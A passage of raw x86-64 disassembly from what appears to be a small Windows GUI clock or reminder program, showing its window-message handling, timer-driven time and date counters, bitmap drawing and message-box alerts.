  402f06:	ff 15 a8 f5 15 00    	call   *0x15f5a8(%rip)        # 0x5624b4
  402f0c:	48 89 d9             	mov    %rbx,%rcx
  402f0f:	48 89 c2             	mov    %rax,%rdx
  402f12:	48 89 c5             	mov    %rax,%rbp
  402f15:	ff d6                	call   *%rsi
  402f17:	31 d2                	xor    %edx,%edx
  402f19:	48 89 d9             	mov    %rbx,%rcx
  402f1c:	49 89 c5             	mov    %rax,%r13
  402f1f:	ff 15 ef f5 15 00    	call   *0x15f5ef(%rip)        # 0x562514
  402f25:	ba 01 00 00 00       	mov    $0x1,%edx
  402f2a:	48 89 d9             	mov    %rbx,%rcx
  402f2d:	ff 15 d9 f5 15 00    	call   *0x15f5d9(%rip)        # 0x56250c
  402f33:	4c 8d 0d 66 a3 15 00 	lea    0x15a366(%rip),%r9        # 0x55d2a0
  402f3a:	41 b8 96 00 00 00    	mov    $0x96,%r8d
  402f40:	ba c6 02 00 00       	mov    $0x2c6,%edx
  402f45:	48 89 d9             	mov    %rbx,%rcx
  402f48:	c7 44 24 20 0c 00 00 	movl   $0xc,0x20(%rsp)
  402f4f:	00 
  402f50:	48 8b 3d c5 f5 15 00 	mov    0x15f5c5(%rip),%rdi        # 0x56251c
  402f57:	ff d7                	call   *%rdi
  402f59:	8b 05 b1 d1 15 00    	mov    0x15d1b1(%rip),%eax        # 0x560110
  402f5f:	44 8b 0d ba d1 15 00 	mov    0x15d1ba(%rip),%r9d        # 0x560120
  402f66:	48 8d 15 40 a3 15 00 	lea    0x15a340(%rip),%rdx        # 0x55d2ad
  402f6d:	44 8b 05 bc d1 15 00 	mov    0x15d1bc(%rip),%r8d        # 0x560130
  402f74:	4c 89 f9             	mov    %r15,%rcx
  402f77:	89 44 24 20          	mov    %eax,0x20(%rsp)
  402f7b:	e8 b8 79 00 00       	call   0x40a938
  402f80:	4c 89 f8             	mov    %r15,%rax
  402f83:	8b 10                	mov    (%rax),%edx
  402f85:	48 83 c0 04          	add    $0x4,%rax
  402f89:	44 8d 82 ff fe fe fe 	lea    -0x1010101(%rdx),%r8d
  402f90:	f7 d2                	not    %edx
  402f92:	41 21 d0             	and    %edx,%r8d
  402f95:	41 81 e0 80 80 80 80 	and    $0x80808080,%r8d
  402f9c:	74 e5                	je     0x402f83
  402f9e:	44 89 c2             	mov    %r8d,%edx
  402fa1:	4d 89 f9             	mov    %r15,%r9
  402fa4:	48 89 d9             	mov    %rbx,%rcx
  402fa7:	c1 ea 10             	shr    $0x10,%edx
  402faa:	41 f7 c0 80 80 00 00 	test   $0x8080,%r8d
  402fb1:	44 0f 44 c2          	cmove  %edx,%r8d
  402fb5:	48 8d 50 02          	lea    0x2(%rax),%rdx
  402fb9:	48 0f 44 c2          	cmove  %rdx,%rax
  402fbd:	45 00 c0             	add    %r8b,%r8b
  402fc0:	ba d0 02 00 00       	mov    $0x2d0,%edx
  402fc5:	48 83 d8 03          	sbb    $0x3,%rax
  402fc9:	41 b8 f0 00 00 00    	mov    $0xf0,%r8d
  402fcf:	4c 29 f8             	sub    %r15,%rax
  402fd2:	4c 8d bc 24 90 00 00 	lea    0x90(%rsp),%r15
  402fd9:	00 
  402fda:	89 44 24 20          	mov    %eax,0x20(%rsp)
  402fde:	ff d7                	call   *%rdi
  402fe0:	8b 05 2a 81 00 00    	mov    0x812a(%rip),%eax        # 0x40b110
  402fe6:	44 8b 0d 33 81 00 00 	mov    0x8133(%rip),%r9d        # 0x40b120
  402fed:	48 8d 15 c8 a2 15 00 	lea    0x15a2c8(%rip),%rdx        # 0x55d2bc
  402ff4:	44 8b 05 35 81 00 00 	mov    0x8135(%rip),%r8d        # 0x40b130
  402ffb:	4c 89 f9             	mov    %r15,%rcx
  402ffe:	89 44 24 20          	mov    %eax,0x20(%rsp)
  403002:	e8 31 79 00 00       	call   0x40a938
  403007:	4c 89 fa             	mov    %r15,%rdx
  40300a:	8b 0a                	mov    (%rdx),%ecx
  40300c:	48 83 c2 04          	add    $0x4,%rdx
  403010:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  403016:	f7 d1                	not    %ecx
  403018:	21 c8                	and    %ecx,%eax
  40301a:	25 80 80 80 80       	and    $0x80808080,%eax
  40301f:	74 e9                	je     0x40300a
  403021:	89 c1                	mov    %eax,%ecx
  403023:	4d 89 f9             	mov    %r15,%r9
  403026:	41 b8 cd 00 00 00    	mov    $0xcd,%r8d
  40302c:	c1 e9 10             	shr    $0x10,%ecx
  40302f:	a9 80 80 00 00       	test   $0x8080,%eax
  403034:	0f 44 c1             	cmove  %ecx,%eax
  403037:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  40303b:	48 0f 44 d1          	cmove  %rcx,%rdx
  40303f:	00 c0                	add    %al,%al
  403041:	48 89 d9             	mov    %rbx,%rcx
  403044:	48 83 da 03          	sbb    $0x3,%rdx
  403048:	4c 29 fa             	sub    %r15,%rdx
  40304b:	89 54 24 20          	mov    %edx,0x20(%rsp)
  40304f:	ba bc 02 00 00       	mov    $0x2bc,%edx
  403054:	ff d7                	call   *%rdi
  403056:	4c 89 f2             	mov    %r14,%rdx
  403059:	48 89 d9             	mov    %rbx,%rcx
  40305c:	ff d6                	call   *%rsi
  40305e:	4c 89 ea             	mov    %r13,%rdx
  403061:	48 89 d9             	mov    %rbx,%rcx
  403064:	ff d6                	call   *%rsi
  403066:	48 8b 1d 67 f4 15 00 	mov    0x15f467(%rip),%rbx        # 0x5624d4
  40306d:	4c 89 e1             	mov    %r12,%rcx
  403070:	ff d3                	call   *%rbx
  403072:	48 89 e9             	mov    %rbp,%rcx
  403075:	ff d3                	call   *%rbx
  403077:	90                   	nop
  403078:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
  40307f:	5b                   	pop    %rbx
  403080:	5e                   	pop    %rsi
  403081:	5f                   	pop    %rdi
  403082:	5d                   	pop    %rbp
  403083:	41 5c                	pop    %r12
  403085:	41 5d                	pop    %r13
  403087:	41 5e                	pop    %r14
  403089:	41 5f                	pop    %r15
  40308b:	c3                   	ret
  40308c:	0f 1f 40 00          	nopl   0x0(%rax)
  403090:	53                   	push   %rbx
  403091:	48 83 ec 20          	sub    $0x20,%rsp
  403095:	8b 42 08             	mov    0x8(%rdx),%eax
  403098:	48 89 cb             	mov    %rcx,%rbx
  40309b:	89 c1                	mov    %eax,%ecx
  40309d:	c1 e9 1f             	shr    $0x1f,%ecx
  4030a0:	01 c8                	add    %ecx,%eax
  4030a2:	48 89 d9             	mov    %rbx,%rcx
  4030a5:	d1 f8                	sar    $1,%eax
  4030a7:	2d 96 00 00 00       	sub    $0x96,%eax
  4030ac:	89 05 86 80 00 00    	mov    %eax,0x8086(%rip)        # 0x40b138
  4030b2:	8b 42 0c             	mov    0xc(%rdx),%eax
  4030b5:	89 c2                	mov    %eax,%edx
  4030b7:	c1 ea 1f             	shr    $0x1f,%edx
  4030ba:	01 d0                	add    %edx,%eax
  4030bc:	d1 f8                	sar    $1,%eax
  4030be:	89 05 70 80 00 00    	mov    %eax,0x8070(%rip)        # 0x40b134
  4030c4:	e8 87 ef ff ff       	call   0x402050
  4030c9:	48 89 d9             	mov    %rbx,%rcx
  4030cc:	e8 2f fa ff ff       	call   0x402b00
  4030d1:	48 89 d9             	mov    %rbx,%rcx
  4030d4:	48 83 c4 20          	add    $0x20,%rsp
  4030d8:	5b                   	pop    %rbx
  4030d9:	e9 62 fd ff ff       	jmp    0x402e40
  4030de:	66 90                	xchg   %ax,%ax
  4030e0:	8b 05 2a d0 15 00    	mov    0x15d02a(%rip),%eax        # 0x560110
  4030e6:	83 c0 01             	add    $0x1,%eax
  4030e9:	83 f8 3b             	cmp    $0x3b,%eax
  4030ec:	89 05 1e d0 15 00    	mov    %eax,0x15d01e(%rip)        # 0x560110
  4030f2:	0f 8e b8 00 00 00    	jle    0x4031b0
  4030f8:	8b 05 22 d0 15 00    	mov    0x15d022(%rip),%eax        # 0x560120
  4030fe:	c7 05 08 d0 15 00 00 	movl   $0x0,0x15d008(%rip)        # 0x560110
  403105:	00 00 00 
  403108:	83 c0 01             	add    $0x1,%eax
  40310b:	83 f8 3b             	cmp    $0x3b,%eax
  40310e:	89 05 0c d0 15 00    	mov    %eax,0x15d00c(%rip)        # 0x560120
  403114:	0f 8e 96 00 00 00    	jle    0x4031b0
  40311a:	8b 05 10 d0 15 00    	mov    0x15d010(%rip),%eax        # 0x560130
  403120:	c7 05 f6 cf 15 00 00 	movl   $0x0,0x15cff6(%rip)        # 0x560120
  403127:	00 00 00 
  40312a:	83 c0 01             	add    $0x1,%eax
  40312d:	83 f8 17             	cmp    $0x17,%eax
  403130:	89 05 fa cf 15 00    	mov    %eax,0x15cffa(%rip)        # 0x560130
  403136:	7e 78                	jle    0x4031b0
  403138:	8b 05 e2 7f 00 00    	mov    0x7fe2(%rip),%eax        # 0x40b120
  40313e:	8b 0d cc 7f 00 00    	mov    0x7fcc(%rip),%ecx        # 0x40b110
  403144:	ba 1e 00 00 00       	mov    $0x1e,%edx
  403149:	c7 05 dd cf 15 00 00 	movl   $0x0,0x15cfdd(%rip)        # 0x560130
  403150:	00 00 00 
  403153:	41 89 c0             	mov    %eax,%r8d
  403156:	83 c1 01             	add    $0x1,%ecx
  403159:	41 83 e0 fd          	and    $0xfffffffd,%r8d
  40315d:	89 0d ad 7f 00 00    	mov    %ecx,0x7fad(%rip)        # 0x40b110
  403163:	41 83 f8 04          	cmp    $0x4,%r8d
  403167:	74 16                	je     0x40317f
  403169:	83 f8 09             	cmp    $0x9,%eax
  40316c:	74 11                	je     0x40317f
  40316e:	83 f8 0b             	cmp    $0xb,%eax
  403171:	74 0c                	je     0x40317f
  403173:	31 d2                	xor    %edx,%edx
  403175:	83 f8 02             	cmp    $0x2,%eax
  403178:	0f 95 c2             	setne  %dl
  40317b:	8d 54 52 1c          	lea    0x1c(%rdx,%rdx,2),%edx
  40317f:	39 ca                	cmp    %ecx,%edx
  403181:	7d 2d                	jge    0x4031b0
  403183:	83 c0 01             	add    $0x1,%eax
  403186:	c7 05 80 7f 00 00 01 	movl   $0x1,0x7f80(%rip)        # 0x40b110
  40318d:	00 00 00 
  403190:	83 f8 0c             	cmp    $0xc,%eax
  403193:	89 05 87 7f 00 00    	mov    %eax,0x7f87(%rip)        # 0x40b120
  403199:	7e 15                	jle    0x4031b0
  40319b:	c7 05 7b 7f 00 00 01 	movl   $0x1,0x7f7b(%rip)        # 0x40b120
  4031a2:	00 00 00 
  4031a5:	83 05 84 7f 00 00 01 	addl   $0x1,0x7f84(%rip)        # 0x40b130
  4031ac:	c3                   	ret
  4031ad:	0f 1f 00             	nopl   (%rax)
  4031b0:	f3 c3                	repz ret
  4031b2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4031b9:	1f 84 00 00 00 00 00 
  4031c0:	41 56                	push   %r14
  4031c2:	41 55                	push   %r13
  4031c4:	41 54                	push   %r12
  4031c6:	55                   	push   %rbp
  4031c7:	57                   	push   %rdi
  4031c8:	56                   	push   %rsi
  4031c9:	53                   	push   %rbx
  4031ca:	48 81 ec c0 04 00 00 	sub    $0x4c0,%rsp
  4031d1:	83 fa 0f             	cmp    $0xf,%edx
  4031d4:	48 89 cb             	mov    %rcx,%rbx
  4031d7:	0f 84 e3 00 00 00    	je     0x4032c0
  4031dd:	76 33                	jbe    0x403212
  4031df:	81 fa 11 01 00 00    	cmp    $0x111,%edx
  4031e5:	74 79                	je     0x403260
  4031e7:	81 fa 13 01 00 00    	cmp    $0x113,%edx
  4031ed:	74 51                	je     0x403240
  4031ef:	48 89 d9             	mov    %rbx,%rcx
  4031f2:	ff 15 1c f6 15 00    	call   *0x15f61c(%rip)        # 0x562814
  4031f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4031ff:	00 
  403200:	48 81 c4 c0 04 00 00 	add    $0x4c0,%rsp
  403207:	5b                   	pop    %rbx
  403208:	5e                   	pop    %rsi
  403209:	5f                   	pop    %rdi
  40320a:	5d                   	pop    %rbp
  40320b:	41 5c                	pop    %r12
  40320d:	41 5d                	pop    %r13
  40320f:	41 5e                	pop    %r14
  403211:	c3                   	ret
  403212:	83 fa 01             	cmp    $0x1,%edx
  403215:	74 6a                	je     0x403281
  403217:	83 fa 02             	cmp    $0x2,%edx
  40321a:	75 d3                	jne    0x4031ef
  40321c:	ba 01 00 00 00       	mov    $0x1,%edx
  403221:	48 8b 35 4c f6 15 00 	mov    0x15f64c(%rip),%rsi        # 0x562874
  403228:	ff d6                	call   *%rsi
  40322a:	ba 02 00 00 00       	mov    $0x2,%edx
  40322f:	48 89 d9             	mov    %rbx,%rcx
  403232:	ff d6                	call   *%rsi
  403234:	31 c9                	xor    %ecx,%ecx
  403236:	ff 15 58 f6 15 00    	call   *0x15f658(%rip)        # 0x562894
  40323c:	31 c0                	xor    %eax,%eax
  40323e:	eb c0                	jmp    0x403200
  403240:	49 83 f8 01          	cmp    $0x1,%r8
  403244:	0f 84 56 02 00 00    	je     0x4034a0
  40324a:	49 83 f8 02          	cmp    $0x2,%r8
  40324e:	0f 84 a0 01 00 00    	je     0x4033f4
  403254:	31 c0                	xor    %eax,%eax
  403256:	eb a8                	jmp    0x403200
  403258:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40325f:	00 
  403260:	66 41 81 c0 bf 63    	add    $0x63bf,%r8w
  403266:	66 41 83 f8 05       	cmp    $0x5,%r8w
  40326b:	77 e7                	ja     0x403254
  40326d:	48 8d 05 c4 a0 15 00 	lea    0x15a0c4(%rip),%rax        # 0x55d338
  403274:	45 0f b7 c0          	movzwl %r8w,%r8d
  403278:	4a 63 14 80          	movslq (%rax,%r8,4),%rdx
  40327c:	48 01 d0             	add    %rdx,%rax
  40327f:	ff e0                	jmp    *%rax
  403281:	45 31 c9             	xor    %r9d,%r9d
  403284:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
  40328a:	ba 01 00 00 00       	mov    $0x1,%edx
  40328f:	48 8b 35 16 f6 15 00 	mov    0x15f616(%rip),%rsi        # 0x5628ac
  403296:	ff d6                	call   *%rsi
  403298:	45 31 c9             	xor    %r9d,%r9d
  40329b:	41 b8 e8 03 00 00    	mov    $0x3e8,%r8d
  4032a1:	ba 02 00 00 00       	mov    $0x2,%edx
  4032a6:	48 89 d9             	mov    %rbx,%rcx
  4032a9:	ff d6                	call   *%rsi
  4032ab:	c7 05 4b ce 15 00 01 	movl   $0x1,0x15ce4b(%rip)        # 0x560100
  4032b2:	00 00 00 
  4032b5:	31 c0                	xor    %eax,%eax
  4032b7:	e9 44 ff ff ff       	jmp    0x403200
  4032bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4032c0:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
  4032c7:	00 
  4032c8:	ff 15 2e f5 15 00    	call   *0x15f52e(%rip)        # 0x5627fc
  4032ce:	48 89 c7             	mov    %rax,%rdi
  4032d1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  4032d6:	48 89 d9             	mov    %rbx,%rcx
  4032d9:	ff 15 65 f5 15 00    	call   *0x15f565(%rip)        # 0x562844
  4032df:	48 89 f9             	mov    %rdi,%rcx
  4032e2:	ff 15 c4 f1 15 00    	call   *0x15f1c4(%rip)        # 0x5624ac
  4032e8:	48 89 c6             	mov    %rax,%rsi
  4032eb:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
  4032f0:	8b 54 24 58          	mov    0x58(%rsp),%edx
  4032f4:	48 89 f9             	mov    %rdi,%rcx
  4032f7:	ff 15 a7 f1 15 00    	call   *0x15f1a7(%rip)        # 0x5624a4
  4032fd:	48 89 f1             	mov    %rsi,%rcx
  403300:	48 89 c2             	mov    %rax,%rdx
  403303:	49 89 c4             	mov    %rax,%r12
  403306:	4c 8b 35 f7 f1 15 00 	mov    0x15f1f7(%rip),%r14        # 0x562504
  40330d:	41 ff d6             	call   *%r14
  403310:	b9 ff ff ff 00       	mov    $0xffffff,%ecx
  403315:	49 89 c5             	mov    %rax,%r13
  403318:	ff 15 a6 f1 15 00    	call   *0x15f1a6(%rip)        # 0x5624c4
  40331e:	48 89 c5             	mov    %rax,%rbp
  403321:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  403326:	49 89 c0             	mov    %rax,%r8
  403329:	48 89 f1             	mov    %rsi,%rcx
  40332c:	ff 15 0a f5 15 00    	call   *0x15f50a(%rip)        # 0x56283c
  403332:	48 89 e9             	mov    %rbp,%rcx
  403335:	48 8b 2d 98 f1 15 00 	mov    0x15f198(%rip),%rbp        # 0x5624d4
  40333c:	ff d5                	call   *%rbp
  40333e:	8b 44 24 58          	mov    0x58(%rsp),%eax
  403342:	48 89 f1             	mov    %rsi,%rcx
  403345:	41 89 c0             	mov    %eax,%r8d
  403348:	41 c1 e8 1f          	shr    $0x1f,%r8d
  40334c:	41 01 c0             	add    %eax,%r8d
  40334f:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
  403353:	41 d1 f8             	sar    $1,%r8d
  403356:	41 81 e8 96 00 00 00 	sub    $0x96,%r8d
  40335d:	44 89 05 d4 7d 00 00 	mov    %r8d,0x7dd4(%rip)        # 0x40b138
  403364:	41 89 c0             	mov    %eax,%r8d
  403367:	41 c1 e8 1f          	shr    $0x1f,%r8d
  40336b:	41 01 c0             	add    %eax,%r8d
  40336e:	41 d1 f8             	sar    $1,%r8d
  403371:	44 89 05 bc 7d 00 00 	mov    %r8d,0x7dbc(%rip)        # 0x40b134
  403378:	e8 d3 ec ff ff       	call   0x402050
  40337d:	48 89 f1             	mov    %rsi,%rcx
  403380:	e8 7b f7 ff ff       	call   0x402b00
  403385:	48 89 f1             	mov    %rsi,%rcx
  403388:	e8 b3 fa ff ff       	call   0x402e40
  40338d:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
  403391:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
  403396:	45 31 c0             	xor    %r8d,%r8d
  403399:	31 d2                	xor    %edx,%edx
  40339b:	48 89 f9             	mov    %rdi,%rcx
  40339e:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
  4033a5:	00 
  4033a6:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  4033ad:	00 
  4033ae:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  4033b5:	00 
  4033b6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
  4033bb:	89 44 24 20          	mov    %eax,0x20(%rsp)
  4033bf:	ff 15 d7 f0 15 00    	call   *0x15f0d7(%rip)        # 0x56249c
  4033c5:	4c 89 ea             	mov    %r13,%rdx
  4033c8:	48 89 f1             	mov    %rsi,%rcx
  4033cb:	41 ff d6             	call   *%r14
  4033ce:	4c 89 e1             	mov    %r12,%rcx
  4033d1:	ff d5                	call   *%rbp
  4033d3:	48 89 f1             	mov    %rsi,%rcx
  4033d6:	ff 15 f0 f0 15 00    	call   *0x15f0f0(%rip)        # 0x5624cc
  4033dc:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
  4033e3:	00 
  4033e4:	48 89 d9             	mov    %rbx,%rcx
  4033e7:	ff 15 3f f4 15 00    	call   *0x15f43f(%rip)        # 0x56282c
  4033ed:	31 c0                	xor    %eax,%eax
  4033ef:	e9 0c fe ff ff       	jmp    0x403200
  4033f4:	8b 05 46 cc 15 00    	mov    0x15cc46(%rip),%eax        # 0x560040
  4033fa:	85 c0                	test   %eax,%eax
  4033fc:	0f 8e 52 fe ff ff    	jle    0x403254
  403402:	48 8d 1d 63 cc 15 00 	lea    0x15cc63(%rip),%rbx        # 0x56006c
  403409:	31 f6                	xor    %esi,%esi
  40340b:	eb 12                	jmp    0x40341f
  40340d:	0f 1f 00             	nopl   (%rax)
  403410:	83 c6 01             	add    $0x1,%esi
  403413:	48 83 c3 10          	add    $0x10,%rbx
  403417:	39 c6                	cmp    %eax,%esi
  403419:	0f 8d 35 fe ff ff    	jge    0x403254
  40341f:	44 8b 13             	mov    (%rbx),%r10d
  403422:	45 85 d2             	test   %r10d,%r10d
  403425:	74 e9                	je     0x403410
  403427:	44 8b 43 f4          	mov    -0xc(%rbx),%r8d
  40342b:	44 3b 05 fe cc 15 00 	cmp    0x15ccfe(%rip),%r8d        # 0x560130
  403432:	75 dc                	jne    0x403410
  403434:	44 8b 4b f8          	mov    -0x8(%rbx),%r9d
  403438:	44 3b 0d e1 cc 15 00 	cmp    0x15cce1(%rip),%r9d        # 0x560120
  40343f:	75 cf                	jne    0x403410
  403441:	8b 53 fc             	mov    -0x4(%rbx),%edx
  403444:	3b 15 c6 cc 15 00    	cmp    0x15ccc6(%rip),%edx        # 0x560110
  40344a:	75 c4                	jne    0x403410
  40344c:	89 54 24 20          	mov    %edx,0x20(%rsp)
  403450:	48 8d 8c 24 c0 00 00 	lea    0xc0(%rsp),%rcx
  403457:	00 
  403458:	48 8d 15 70 9e 15 00 	lea    0x159e70(%rip),%rdx        # 0x55d2cf
  40345f:	e8 d4 74 00 00       	call   0x40a938
  403464:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  40346a:	4c 8d 05 7a 9e 15 00 	lea    0x159e7a(%rip),%r8        # 0x55d2eb
  403471:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
  403478:	00 
  403479:	48 8b 0d c0 cc 15 00 	mov    0x15ccc0(%rip),%rcx        # 0x560140
  403480:	4c 8b 15 05 f4 15 00 	mov    0x15f405(%rip),%r10        # 0x56288c
  403487:	41 ff d2             	call   *%r10
  40348a:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
  403490:	8b 05 aa cb 15 00    	mov    0x15cbaa(%rip),%eax        # 0x560040
  403496:	e9 75 ff ff ff       	jmp    0x403410
  40349b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4034a0:	44 8b 1d 59 cc 15 00 	mov    0x15cc59(%rip),%r11d        # 0x560100
  4034a7:	45 85 db             	test   %r11d,%r11d
  4034aa:	0f 84 a4 fd ff ff    	je     0x403254
  4034b0:	e8 2b fc ff ff       	call   0x4030e0
  4034b5:	45 31 c0             	xor    %r8d,%r8d
  4034b8:	31 d2                	xor    %edx,%edx
  4034ba:	48 89 d9             	mov    %rbx,%rcx
  4034bd:	ff 15 a9 f3 15 00    	call   *0x15f3a9(%rip)        # 0x56286c
  4034c3:	31 c0                	xor    %eax,%eax
  4034c5:	e9 36 fd ff ff       	jmp    0x403200
  4034ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4034d0:	31 c0                	xor    %eax,%eax
  4034d2:	83 3d 67 cb 15 00 00 	cmpl   $0x0,0x15cb67(%rip)        # 0x560040
  4034d9:	48 8d bc 24 d8 00 00 	lea    0xd8(%rsp),%rdi
  4034e0:	00 
  4034e1:	49 b8 20 20 c7 b0 20 	movabs $0xc3202020b0c72020,%r8
  4034e8:	20 20 c3 
  4034eb:	49 b9 b5 20 20 20 20 	movabs $0xa3a2020202020b5,%r9
  4034f2:	20 3a 0a 
  4034f5:	b9 7d 00 00 00       	mov    $0x7d,%ecx
  4034fa:	4c 89 84 24 c0 00 00 	mov    %r8,0xc0(%rsp)
  403501:	00 
  403502:	4c 89 8c 24 c8 00 00 	mov    %r9,0xc8(%rsp)
  403509:	00 
  40350a:	48 c7 84 24 d0 00 00 	movq   $0xa,0xd0(%rsp)
  403511:	00 0a 00 00 00 
  403516:	f3 48 ab             	rep stos %rax,(%rdi)
  403519:	0f 84 ec 00 00 00    	je     0x40360b
  40351f:	0f 8e 40 01 00 00    	jle    0x403665
  403525:	48 8d 35 3c cb 15 00 	lea    0x15cb3c(%rip),%rsi        # 0x560068
  40352c:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  403533:	00 
  403534:	31 ff                	xor    %edi,%edi
  403536:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40353d:	00 00 00 
  403540:	48 8d 05 df 9d 15 00 	lea    0x159ddf(%rip),%rax        # 0x55d326
  403547:	83 c7 01             	add    $0x1,%edi
  40354a:	48 8d 15 be 9d 15 00 	lea    0x159dbe(%rip),%rdx        # 0x55d30f
  403551:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  403556:	41 89 f8             	mov    %edi,%r8d
  403559:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40355e:	8b 06                	mov    (%rsi),%eax
  403560:	89 44 24 28          	mov    %eax,0x28(%rsp)
  403564:	8b 46 fc             	mov    -0x4(%rsi),%eax
  403567:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40356b:	44 8b 4e f8          	mov    -0x8(%rsi),%r9d
  40356f:	48 83 c6 10          	add    $0x10,%rsi
  403573:	e8 c0 73 00 00       	call   0x40a938
  403578:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
  40357d:	48 89 e9             	mov    %rbp,%rcx
  403580:	e8 bb 73 00 00       	call   0x40a940
  403585:	39 3d b5 ca 15 00    	cmp    %edi,0x15cab5(%rip)        # 0x560040
  40358b:	7f b3                	jg     0x403540
  40358d:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  403593:	4c 8d 05 93 9d 15 00 	lea    0x159d93(%rip),%r8        # 0x55d32d
  40359a:	48 89 ea             	mov    %rbp,%rdx
  40359d:	48 89 d9             	mov    %rbx,%rcx
  4035a0:	ff 15 e6 f2 15 00    	call   *0x15f2e6(%rip)        # 0x56288c
  4035a6:	31 c0                	xor    %eax,%eax
  4035a8:	e9 53 fc ff ff       	jmp    0x403200
  4035ad:	0f 1f 00             	nopl   (%rax)
  4035b0:	c7 05 46 cb 15 00 00 	movl   $0x0,0x15cb46(%rip)        # 0x560100
  4035b7:	00 00 00 
  4035ba:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  4035c0:	4c 8d 05 2d 9d 15 00 	lea    0x159d2d(%rip),%r8        # 0x55d2f4
  4035c7:	48 8d 15 36 9d 15 00 	lea    0x159d36(%rip),%rdx        # 0x55d304
  4035ce:	ff 15 b8 f2 15 00    	call   *0x15f2b8(%rip)        # 0x56288c
  4035d4:	31 c0                	xor    %eax,%eax
  4035d6:	e9 25 fc ff ff       	jmp    0x403200
  4035db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4035e0:	c7 05 16 cb 15 00 01 	movl   $0x1,0x15cb16(%rip)        # 0x560100
  4035e7:	00 00 00 
  4035ea:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  4035f0:	4c 8d 05 fd 9c 15 00 	lea    0x159cfd(%rip),%r8        # 0x55d2f4
  4035f7:	48 8d 15 fb 9c 15 00 	lea    0x159cfb(%rip),%rdx        # 0x55d2f9
  4035fe:	ff 15 88 f2 15 00    	call   *0x15f288(%rip)        # 0x56288c
  403604:	31 c0                	xor    %eax,%eax
  403606:	e9 f5 fb ff ff       	jmp    0x403200
  40360b:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  403612:	00 
  403613:	48 89 ea             	mov    %rbp,%rdx
  403616:	8b 0a                	mov    (%rdx),%ecx
  403618:	48 83 c2 04          	add    $0x4,%rdx
  40361c:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  403622:	f7 d1                	not    %ecx
  403624:	21 c8                	and    %ecx,%eax
  403626:	25 80 80 80 80       	and    $0x80808080,%eax
  40362b:	74 e9                	je     0x403616
  40362d:	89 c1                	mov    %eax,%ecx
  40362f:	c1 e9 10             	shr    $0x10,%ecx
  403632:	a9 80 80 00 00       	test   $0x8080,%eax
  403637:	0f 44 c1             	cmove  %ecx,%eax
  40363a:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  40363e:	48 0f 44 d1          	cmove  %rcx,%rdx
  403642:	00 c0                	add    %al,%al
  403644:	48 b9 c3 bb 20 20 20 	movabs $0x202020202020bbc3,%rcx
  40364b:	20 20 20 
  40364e:	48 83 da 03          	sbb    $0x3,%rdx
  403652:	48 89 0a             	mov    %rcx,(%rdx)
  403655:	c7 42 08 20 20 20 20 	movl   $0x20202020,0x8(%rdx)
  40365c:	c6 42 0c 00          	movb   $0x0,0xc(%rdx)
  403660:	e9 28 ff ff ff       	jmp    0x40358d
  403665:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  40366c:	00 
  40366d:	e9 1b ff ff ff       	jmp    0x40358d
  403672:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  403679:	1f 84 00 00 00 00 00 
  403680:	57                   	push   %rdi
  403681:	56                   	push   %rsi
  403682:	53                   	push   %rbx
  403683:	48 83 ec 60          	sub    $0x60,%rsp
  403687:	48 8d 15 c2 9c 15 00 	lea    0x159cc2(%rip),%rdx        # 0x55d350
  40368e:	48 8d 0d bd 9c 15 00 	lea    0x159cbd(%rip),%rcx        # 0x55d352
  403695:	e8 ae 72 00 00       	call   0x40a948
  40369a:	48 85 c0             	test   %rax,%rax
  40369d:	48 89 c3             	mov    %rax,%rbx
  4036a0:	74 42                	je     0x4036e4
  4036a2:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
  4036a7:	48 8d 3d b2 c9 15 00 	lea    0x15c9b2(%rip),%rdi        # 0x560060
  4036ae:	c7 05 88 c9 15 00 00 	movl   $0x0,0x15c988(%rip)        # 0x560040
  4036b5:	00 00 00 
  4036b8:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
  4036bd:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
  4036c2:	48 8d 15 9a 9c 15 00 	lea    0x159c9a(%rip),%rdx        # 0x55d363
  4036c9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
